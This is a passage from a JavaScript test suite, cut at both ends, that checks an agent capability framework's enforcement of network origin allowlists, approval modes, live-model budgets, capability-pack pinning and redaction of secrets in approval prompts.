      assert.equal(postResponseRecords[0].state, EffectState.failed);
      assert.equal(postResponseFailureFetchCount, 1);

      let directFetchCalled = false;
      globalThis.fetch = async () => {
        directFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"ok"}}', { status: 200 });
      };
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), hostRequestFingerprint: undefined }),
        { code: 'ERR_HOST_REQUEST_FINGERPRINT_REQUIRED' },
      );
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), hostRequestFingerprint: 'not-a-world-prefix-deadbeef' }),
        { code: 'ERR_HOST_REQUEST_FINGERPRINT_REQUIRED' },
      );
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), hostRequestFingerprint: 'world:host-request:10000000000000000' }),
        { code: 'ERR_HOST_REQUEST_FINGERPRINT_RANGE' },
      );
      assert.equal(directFetchCalled, false);
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined }),
        { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
      );
      assert.equal(directFetchCalled, false);
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({}, httpRequest()),
        { code: 'ERR_CAPABILITY_LIVE_DENIED' },
      );
      assert.equal(directFetchCalled, false);
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true },
        }, httpRequest()),
        { code: 'ERR_CAPABILITY_ORIGIN_ALLOWLIST_REQUIRED' },
      );
      assert.equal(directFetchCalled, false);

      let blockedFetchCalled = false;
      globalThis.fetch = async () => {
        blockedFetchCalled = true;
        return new Response('{}', { status: 200 });
      };
      const blockedDriver = new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://blocked.example/decide' });
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: blockedDriver,
          hostRequest: httpRequest(),
          journalOptions: {
            store: new MemoryStore(),
            runId: 'policy-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }),
        { code: 'ERR_CAPABILITY_ORIGIN_DENIED' },
      );
      assert.equal(blockedFetchCalled, false);

      let approvalFetchCalled = false;
      globalThis.fetch = async () => {
        approvalFetchCalled = true;
        return new Response('{}', { status: 200 });
      };
      const denied = await runCapabilityMode({
        mode: 'approval',
        driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
        hostRequest: httpRequest(),
        approval: () => ({ approved: false }),
      });
      assert.equal(denied.approved, false);
      assert.equal(approvalFetchCalled, false);
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'approval',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
          hostRequest: httpRequest(),
          approval: () => ({ approved: true }),
        }),
        { code: 'ERR_CAPABILITY_LIVE_DENIED' },
      );
      assert.equal(approvalFetchCalled, false);

      globalThis.fetch = async () => new Response('{"status":"ok"}', {
        status: 200,
        headers: { 'x-request-id': 'request-approved' },
      });
      const approvedNetwork = await runCapabilityMode({
        mode: 'approval',
        driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
        hostRequest: httpRequest(),
        journalOptions: {
          store: new MemoryStore(),
          runId: 'approval-network-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          requireApprovalForNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
        approval: () => ({ approved: true }),
      });
      assert.equal(decodeResolutionInputBytes(approvedNetwork.resolutionInputBytes).status, 0);
      assert.equal(approvedNetwork.submittedToWorld, false);

      let promptedHeader = null;
      const promptProvider = new PromptSecretProvider({
        prompt: async () => 'Bearer prompted-token',
      });
      assert.equal(promptProvider.has('API_TOKEN'), true);
      globalThis.fetch = async (url, options) => {
        promptedHeader = options.headers.Authorization;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        secretHeaders: { Authorization: 'API_TOKEN' },
        secretProvider: promptProvider,
      }).resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, httpRequest());
      assert.equal(promptedHeader, 'Bearer prompted-token');
    } finally {
      globalThis.fetch = originalFetch;
    }

    const approval = new HumanApprovalCapabilityDriver({ mode: 'noninteractive-allow' });
    assert.deepEqual(approval.manifest().supportedResponseStatuses, ['ok']);
    assert.deepEqual(new HumanApprovalCapabilityDriver({ mode: 'noninteractive-deny' }).manifest().supportedResponseStatuses, ['rejected']);
    const packApproval = new HumanApprovalPackCapabilityDriver({ mode: 'noninteractive-allow' });
    assert.deepEqual(packApproval.manifest().supportedResponseStatuses, ['ok']);
    assert.deepEqual(new HumanApprovalPackCapabilityDriver({ mode: 'noninteractive-deny' }).manifest().supportedResponseStatuses, ['rejected']);
    assert.equal(packApproval.preflight({}, approvalRequest()).accepted, false);
    const unsupportedPackApproval = new HumanApprovalPackCapabilityDriver({ mode: 'interactive', prompt: async () => true });
    const unsupportedPackApprovalReport = unsupportedPackApproval.preflight({
      policy: { allowLiveEffects: true, allowHumanEffects: true },
    }, approvalRequest());
    assert.equal(unsupportedPackApprovalReport.accepted, false);
    assert.ok(unsupportedPackApprovalReport.blockers.includes('ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED'));
    await assert.rejects(
      () => unsupportedPackApproval.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, approvalRequest()),
      { code: 'ERR_HUMAN_APPROVAL_MODE_UNSUPPORTED' },
    );
    const pinnedApprovalPackFingerprint = 'sha256:'.concat('6'.repeat(64));
    const pinnedPackApproval = new HumanApprovalPackCapabilityDriver({
      mode: 'noninteractive-allow',
      packFingerprint: pinnedApprovalPackFingerprint,
    });
    await assert.rejects(
      () => pinnedPackApproval.resolve({
        policy: {
          allowLiveEffects: true,
          allowHumanEffects: true,
          deniedCapabilityPacks: [pinnedApprovalPackFingerprint],
        },
      }, approvalRequest()),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    await assert.rejects(
      () => pinnedPackApproval.resolve({
        policy: {
          allowLiveEffects: true,
          allowHumanEffects: true,
          allowedCapabilityPacks: ['sha256:'.concat('7'.repeat(64))],
        },
      }, approvalRequest()),
      { code: 'ERR_CAPABILITY_PACK_NOT_ALLOWED' },
    );
    await assert.rejects(
      () => packApproval.resolve({
        policy: {
          allowLiveEffects: true,
          allowHumanEffects: true,
          maximumResponseBytes: 1,
        },
      }, approvalRequest()),
      { code: 'ERR_CAPABILITY_RESPONSE_LIMIT_EXCEEDS_POLICY' },
    );
    await assert.rejects(
      () => packApproval.resolve({}, approvalRequest()),
      { code: 'ERR_CAPABILITY_LIVE_DENIED' },
    );
    await assert.rejects(
      () => packApproval.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, { ...approvalRequest(), responseSchema: { status: 'rejected' } }),
      { code: 'ERR_HUMAN_APPROVAL_RESPONSE_SCHEMA_UNSUPPORTED' },
    );
    assert.equal(decodeResolutionInputBytes((await packApproval.resolve({
      policy: { allowLiveEffects: true, allowHumanEffects: true },
    }, approvalRequest())).resolutionInputBytes).status, 0);
    assert.equal(approval.preflight({}, httpRequest()).accepted, false);
    const proposedApproval = approval.dryRun({}, {
      ...approvalRequest(),
      requestBytes: fromUtf8(stableJson({ action: 'approve-file-write', password: 'fixture-password', apiKey: 'fixture-key' })),
    });
    assert.equal(proposedApproval.proposedAction.approval.password, '[redacted]');
    assert.equal(proposedApproval.proposedAction.approval.apiKey, '[redacted]');
    let promptedProposal = null;
    const interactiveApproval = new HumanApprovalCapabilityDriver({
      mode: 'interactive-terminal',
      prompt: async ({ proposed }) => {
        promptedProposal = proposed;
        return true;
      },
    });
    let directPromptCalled = false;
    const directDeniedApproval = new HumanApprovalCapabilityDriver({
      mode: 'interactive-terminal',
      prompt: async () => {
        directPromptCalled = true;
        return true;
      },
    });
    await assert.rejects(
      () => directDeniedApproval.resolve({}, approvalRequest()),
      { code: 'ERR_CAPABILITY_LIVE_DENIED' },
    );
    assert.equal(directPromptCalled, false);
    let targetPromptCalled = false;
    const targetDeniedApproval = new HumanApprovalCapabilityDriver({
      mode: 'interactive-terminal',
      prompt: async () => {
        targetPromptCalled = true;
        return true;
      },
    });
    await assert.rejects(
      () => targetDeniedApproval.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, { ...approvalRequest(), hostRequestFingerprint: undefined }),
      { code: 'ERR_HOST_REQUEST_FINGERPRINT_REQUIRED' },
    );
    await assert.rejects(
      () => targetDeniedApproval.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, { ...approvalRequest(), hostRequestFingerprint: 'not-a-world-prefix-deadbeef' }),
      { code: 'ERR_HOST_REQUEST_FINGERPRINT_REQUIRED' },
    );
    await assert.rejects(
      () => targetDeniedApproval.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, { ...approvalRequest(), hostRequestFingerprint: 'world:host-request:10000000000000000' }),
      { code: 'ERR_HOST_REQUEST_FINGERPRINT_RANGE' },
    );
    assert.equal(targetPromptCalled, false);
    const fixedDeny = new HumanApprovalCapabilityDriver({ mode: 'noninteractive-deny' });
    assert.equal(fixedDeny.preflight({
      policy: { allowLiveEffects: true, allowHumanEffects: true },
    }, approvalRequest()).accepted, false);
    await assert.rejects(
      () => fixedDeny.resolve({
        policy: { allowLiveEffects: true, allowHumanEffects: true },
      }, approvalRequest()),
      { code: 'ERR_HUMAN_APPROVAL_RESPONSE_SCHEMA_UNSUPPORTED' },
    );
    await interactiveApproval.resolve({
      policy: { allowLiveEffects: true, allowHumanEffects: true },
    }, {
      ...approvalRequest(),
      requestBytes: fromUtf8(stableJson({ action: 'approve-file-write', password: 'fixture-password', apiKey: 'fixture-key' })),
    });
    assert.equal(promptedProposal.password, '[redacted]');
    assert.equal(promptedProposal.apiKey, '[redacted]');
    assert.equal(JSON.stringify(promptedProposal).includes('fixture-password'), false);
    const operatorRecovery = await defineCapabilityDriver(approval).recover({}, {});
    assert.equal(operatorRecovery.operatorInterventionRequired, true);
    const approved = await approval.resolve({
      policy: { allowLiveEffects: true, allowHumanEffects: true },
    }, approvalRequest());
    assert.equal(decodeResolutionInputBytes(approved.resolutionInputBytes).status, 0);
    assert.equal(approved.diagnostics.decision, 'approved');
  });

  it('honors driver preflight before live and approved live resolution', async () => {
    const fixtureDriver = new FixtureAgentModelCapabilityDriver();
    const malformedFixturePreflight = fixtureDriver.preflight({}, {
      ...modelRequest('goal=invoke', 'malformed-fixture-preflight-key'),
      requestBytes: fromUtf8(stableJson({ schema: 'not-boundary.Agent.DecisionPrompt.v0' })),
    });
    assert.equal(malformedFixturePreflight.accepted, false);
    assert.deepEqual(malformedFixturePreflight.blockers, ['ERR_AGENT_DECISION_PROMPT_SCHEMA']);
    const fixturePackDriver = new FixturePackCapabilityDriver();
    const malformedFixturePackPreflight = fixturePackDriver.preflight({}, {
      ...modelRequest('goal=invoke', 'malformed-fixture-pack-preflight-key'),
      requestBytes: fromUtf8(stableJson({ schema: 'not-boundary.Agent.DecisionPrompt.v0' })),
    });
    assert.equal(malformedFixturePackPreflight.accepted, false);
    assert.deepEqual(malformedFixturePackPreflight.blockers, ['ERR_AGENT_DECISION_PROMPT_SCHEMA']);

    const liveDriver = preflightBlockedDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'live',
        driver: liveDriver,
        hostRequest: httpRequest(),
        journalOptions: {
          store: new MemoryStore(),
          runId: 'preflight-live-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_PREFLIGHT_BLOCKED' },
    );
    assert.equal(liveDriver.resolveCalled, false);

    const approvalDriver = preflightBlockedDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'approval',
        driver: approvalDriver,
        hostRequest: httpRequest(),
        approval: () => ({ approved: true }),
        journalOptions: {
          store: new MemoryStore(),
          runId: 'preflight-approval-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_PREFLIGHT_BLOCKED' },
    );
    assert.equal(approvalDriver.resolveCalled, false);
  });

  it('enforces live mode pack and raw network policy before resolve', async () => {
    const packFingerprint = 'sha256:'.concat('2'.repeat(64));
    const deniedPackDriver = policyProbeDriver({ packFingerprint });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'live',
        driver: deniedPackDriver,
        hostRequest: httpRequest(),
        journalOptions: {
          store: new MemoryStore(),
          runId: 'denied-pack-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          deniedCapabilityPacks: [packFingerprint],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    assert.equal(deniedPackDriver.resolveCalled, false);

    const deniedOriginDriver = policyProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'live',
        driver: deniedOriginDriver,
        hostRequest: httpRequest(),
        journalOptions: {
          store: new MemoryStore(),
          runId: 'denied-origin-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://denied.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_ORIGIN_DENIED' },
    );
    assert.equal(deniedOriginDriver.resolveCalled, false);

    const unknownNetworkTargetDriver = policyProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'live',
        driver: unknownNetworkTargetDriver,
        hostRequest: { ...httpRequest(), requestBytes: fromUtf8(stableJson({ body: { prompt: 'hi' } })) },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'unknown-network-target-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_NETWORK_TARGET_REQUIRED' },
    );
    assert.equal(unknownNetworkTargetDriver.resolveCalled, false);

    const dryRunDeniedPackDriver = policyProbeDriver({ packFingerprint });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'dry-run',
        driver: dryRunDeniedPackDriver,
        hostRequest: httpRequest(),
        policy: {
          allowNetworkEffects: true,
          deniedCapabilityPacks: [packFingerprint],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    assert.equal(dryRunDeniedPackDriver.dryRunCalled, false);

    const approvalDeniedPackDriver = policyProbeDriver({ packFingerprint });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'approval',
        driver: approvalDeniedPackDriver,
        hostRequest: httpRequest(),
        approval: () => ({ approved: false }),
        policy: {
          allowNetworkEffects: true,
          deniedCapabilityPacks: [packFingerprint],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    assert.equal(approvalDeniedPackDriver.dryRunCalled, false);

    const localShadowDeniedPackDriver = localPolicyProbeDriver({ packFingerprint });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: localShadowDeniedPackDriver,
        hostRequest: modelRequest('goal=local-shadow-policy', 'model-local-shadow-policy-key'),
        recordedResolution: null,
        policy: { deniedCapabilityPacks: [packFingerprint] },
      }),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    assert.equal(localShadowDeniedPackDriver.shadowCalled, false);

    const defaultDeniedShadowDriver = policyProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: defaultDeniedShadowDriver,
        hostRequest: httpRequest(),
        recordedResolution: null,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }),
      { code: 'ERR_CAPABILITY_SHADOW_LIVE_EFFECT_DENIED' },
    );
    assert.equal(defaultDeniedShadowDriver.shadowCalled, false);

    const deniedShadowDriver = policyProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: deniedShadowDriver,
        hostRequest: httpRequest(),
        context: { allowShadowNetwork: true },
        recordedResolution: null,
      }),
      { code: 'ERR_CAPABILITY_LIVE_DENIED' },
    );
    assert.equal(deniedShadowDriver.shadowCalled, false);

    const allowedShadowDriver = policyProbeDriver();
    const shadow = await runCapabilityMode({
      mode: 'shadow',
      driver: allowedShadowDriver,
      hostRequest: httpRequest(),
      context: { allowShadowNetwork: true },
      recordedResolution: null,
      policy: {
        allowLiveEffects: true,
        allowNetworkEffects: true,
        allowedOrigins: ['https://allowed.example'],
        allowedMethods: ['POST'],
      },
    });
    assert.equal(allowedShadowDriver.shadowCalled, true);
    assert.equal(shadow.shadow.liveInvoked, true);

    const defaultDeniedModelShadowDriver = modelShadowProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: defaultDeniedModelShadowDriver,
        hostRequest: genericHttpModelRequest('goal=shadow-model', 'model-shadow-default-key'),
        recordedResolution: null,
        policy: { allowLiveEffects: true, maximumLiveModelCalls: 1 },
      }),
      { code: 'ERR_CAPABILITY_SHADOW_LIVE_EFFECT_DENIED' },
    );
    assert.equal(defaultDeniedModelShadowDriver.shadowCalled, false);

    const unlabeledDeniedModelShadowDriver = modelShadowProbeDriver({ authorityLabels: [] });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: unlabeledDeniedModelShadowDriver,
        hostRequest: genericHttpModelRequest('goal=shadow-unlabeled-model', 'model-shadow-unlabeled-key'),
        recordedResolution: null,
        policy: { allowLiveEffects: true, maximumLiveModelCalls: 1 },
      }),
      { code: 'ERR_CAPABILITY_SHADOW_LIVE_EFFECT_DENIED' },
    );
    assert.equal(unlabeledDeniedModelShadowDriver.shadowCalled, false);

    const budgetDeniedModelShadowDriver = modelShadowProbeDriver();
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: budgetDeniedModelShadowDriver,
        hostRequest: genericHttpModelRequest('goal=shadow-model', 'model-shadow-budget-key'),
        context: { allowShadowLiveEffects: true },
        recordedResolution: null,
        policy: { allowLiveEffects: true },
      }),
      { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' },
    );
    assert.equal(budgetDeniedModelShadowDriver.shadowCalled, false);

    const allowedModelShadowDriver = modelShadowProbeDriver();
    const modelShadow = await runCapabilityMode({
      mode: 'shadow',
      driver: allowedModelShadowDriver,
      hostRequest: genericHttpModelRequest('goal=shadow-model', 'model-shadow-allowed-key'),
      context: { allowShadowLiveEffects: true },
      recordedResolution: null,
      policy: { allowLiveEffects: true, maximumLiveModelCalls: 1 },
    });
    assert.equal(allowedModelShadowDriver.shadowCalled, true);
    assert.equal(modelShadow.shadow.liveInvoked, true);
  });

  it('validates model capability output as Boundary Agent.Action', async () => {
    assert.deepEqual(validateAgentAction({ variant: 'final', text: 'ok' }), { variant: 'final', text: 'ok' });
    assert.throws(
      () => validateAgentAction({ variant: 'tool', toolId: 'unknown_tool', payload: '' }),
      { code: 'ERR_AGENT_ACTION_TOOL_UNKNOWN' },
    );
    assert.throws(
      () => validateAgentAction({ variant: 'malformed', payload: 'not an action' }),
      { code: 'ERR_AGENT_ACTION_MALFORMED' },
    );

    const originalFetch = globalThis.fetch;
    try {
      globalThis.fetch = async () => new Response('{"action":{"variant":"tool","toolId":"actuate","payload":""}}', {
        status: 200,
        headers: { 'x-request-id': 'request-2' },
      });
      const driver = new GenericHttpJsonModelDriver({ endpointUrl: 'https://allowed.example/decide' });
      assert.deepEqual(driver.manifest().supportedResponseStatuses, ['ok', 'http_error', 'failed', 'deferred']);
      assert.equal(driver.dryRun({}, genericHttpModelRequest('goal=invoke', 'model-dry-key')).wouldInvoke, true);
      assert.throws(() => new GenericHttpJsonModelDriver({
        endpointUrl: 'https://allowed.example/decide?api_key=secret',
      }), { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' });
      assert.throws(() => new GenericHttpJsonModelDriver({
        endpointUrl: 'https://allowed.example/decide?q=api_key=supersecret123',
      }), { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' });
      const wrongModelRequestPreflight = driver.preflight(
        {
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumLiveModelCalls: 1,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        },
        {
          ...genericHttpModelRequest('goal=invoke', 'model-wrong-actuator-key'),
          actuatorRef: 'model:other',
        },
      );
      assert.equal(wrongModelRequestPreflight.accepted, false);
      assert.equal(wrongModelRequestPreflight.blockers.includes('ERR_ACTUATOR_REF_NOT_SUPPORTED'), true);
      const deniedPreflight = driver.preflight(
        {
          policy: {
            allowLiveEffects: true,
            maximumLiveModelCalls: 1,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        },
        genericHttpModelRequest('goal=invoke', 'model-preflight-key'),
      );
      assert.equal(deniedPreflight.accepted, false);
      assert.equal(deniedPreflight.blockers.includes('ERR_CAPABILITY_NETWORK_DENIED'), true);
      let authorityDeniedFetchCalled = false;
      globalThis.fetch = async () => {
        authorityDeniedFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"authority bypassed"}}', { status: 200 });
      };
      const authorityDeniedPreflight = driver.preflight(
        {
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumLiveModelCalls: 1,
            allowedAuthorityLabels: ['network:http'],
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        },
        genericHttpModelRequest('goal=invoke', 'model-authority-preflight-key'),
      );
      assert.equal(authorityDeniedPreflight.accepted, false);
      assert.equal(authorityDeniedPreflight.blockers.includes('ERR_CAPABILITY_AUTHORITY_DENIED'), true);
      await assert.rejects(
        () => driver.resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumLiveModelCalls: 1,
            allowedAuthorityLabels: ['network:http'],
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, genericHttpModelRequest('goal=invoke', 'model-authority-key')),
        { code: 'ERR_CAPABILITY_AUTHORITY_DENIED' },
      );
      assert.equal(authorityDeniedFetchCalled, false);
      let budgetFetchCalled = false;
      globalThis.fetch = async () => {
        budgetFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"budget bypassed"}}', { status: 200 });
      };
      await assert.rejects(
        () => driver.resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, genericHttpModelRequest('goal=invoke', 'model-budget-key')),
        { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' },
      );
      assert.equal(budgetFetchCalled, false);
      const pinnedModelDriver = new GenericHttpJsonModelDriver({
        endpointUrl: 'https://allowed.example/decide',
      });
      globalThis.fetch = async () => new Response('{"action":{"variant":"tool","toolId":"actuate","payload":""}}', {
        status: 200,
        headers: { 'x-request-id': 'request-2' },
      });
      const pinnedModelPreflight = pinnedModelDriver.preflight({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedAuthorityLabels: ['model:http-json', 'network:http'],
          allowedCapabilityPacks: ['generic-http-json-model'],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, genericHttpModelRequest('goal=invoke', 'model-pinned-pack-preflight-key'));
      assert.equal(pinnedModelPreflight.accepted, true);
      const pinnedModel = await pinnedModelDriver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedAuthorityLabels: ['model:http-json', 'network:http'],
          allowedCapabilityPacks: ['generic-http-json-model'],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, genericHttpModelRequest('goal=invoke', 'model-pinned-pack-key'));
      assert.equal(decodeResolutionInputBytes(pinnedModel.resolutionInputBytes).status, 0);
      const result = await driver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, genericHttpModelRequest('goal=invoke', 'model-http-key'));
      const semanticResolution = decodeResolutionInputBytes(result.resolutionInputBytes);
      const semanticHostClaim = JSON.parse(new TextDecoder().decode(semanticResolution.hostClaimBytes));
      const semanticMetadata = JSON.parse(new TextDecoder().decode(semanticResolution.metadata));
      assert.deepEqual(
        decodeAgentActionFromResolutionInput(result.resolutionInputBytes),
        { variant: 'tool', toolId: 'actuate', payload: '' },
      );
      assert.deepEqual(result.hostClaimBytes, semanticResolution.hostClaimBytes);
      assert.equal(semanticHostClaim.worldAuthoredEvidence, false);
      assert.equal(semanticHostClaim.value.driver, 'generic-http-json-model');
      assert.equal(semanticHostClaim.value.transportDriver, 'generic-http-json');
      assert.equal(semanticMetadata.driver, 'generic-http-json-model');
      assert.equal(semanticMetadata.transportDriver, 'generic-http-json');
      assert.equal(semanticMetadata.outputSchema, 'boundary.Agent.Action.v0');

      let liveModelFetchCount = 0;
      globalThis.fetch = async () => {
        liveModelFetchCount += 1;
        return new Response('{"action":{"variant":"final","text":"live ok"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-live-model' },
        });
      };
      const liveModelJournalOptions = {
        store: new MemoryStore(),
        runId: 'model-live-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      const liveModelRequest = genericHttpModelRequest('goal=invoke', 'model-live-key');
      const liveModel = await runCapabilityMode({
        mode: 'live',
        driver,
        hostRequest: liveModelRequest,
        journalOptions: liveModelJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(liveModelFetchCount, 1);
      assert.deepEqual(
        decodeAgentActionFromResolutionInput(liveModel.resolutionInputBytes),
        { variant: 'final', text: 'live ok' },
      );
      const replayedLiveModel = await runCapabilityMode({
        mode: 'live',
        driver,
        hostRequest: liveModelRequest,
        journalOptions: liveModelJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 0,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(replayedLiveModel.reused, true);
      assert.equal(liveModelFetchCount, 1);

      globalThis.fetch = async () => new Response('{"action":{"variant":"tool","toolId":"unknown_tool","payload":""}}', { status: 200 });
      const unknownAction = await driver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          maximumLiveModelCalls: 1,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, { ...genericHttpModelRequest('goal=invoke', 'model-http-key-unknown'), responseSchema: { status: 'failed' } });
      const unknownActionResolution = decodeResolutionInputBytes(unknownAction.resolutionInputBytes);
      const unknownActionMetadata = JSON.parse(new TextDecoder().decode(unknownActionResolution.metadata));
      assert.equal(unknownActionResolution.status, 2);
      assert.equal(unknownActionMetadata.status, 'failed');
      assert.equal(unknownActionMetadata.failureCode, 'ERR_AGENT_ACTION_TOOL_UNKNOWN');
      assert.equal(unknownAction.diagnostics.failureCode, 'ERR_AGENT_ACTION_TOOL_UNKNOWN');

      let invalidLiveFetchCount = 0;
      globalThis.fetch = async () => {
        invalidLiveFetchCount += 1;
        return new Response('{"action":{"variant":"tool","toolId":"unknown_tool","payload":""}}', {
          status: 200,
          headers: { 'x-request-id': 'request-invalid-model-action' },
        });
      };
      const invalidLiveModel = await runCapabilityMode({
        mode: 'live',
        driver,
        hostRequest: { ...genericHttpModelRequest('goal=invoke', 'model-live-invalid-key'), responseSchema: { status: 'failed' } },
        journalOptions: {
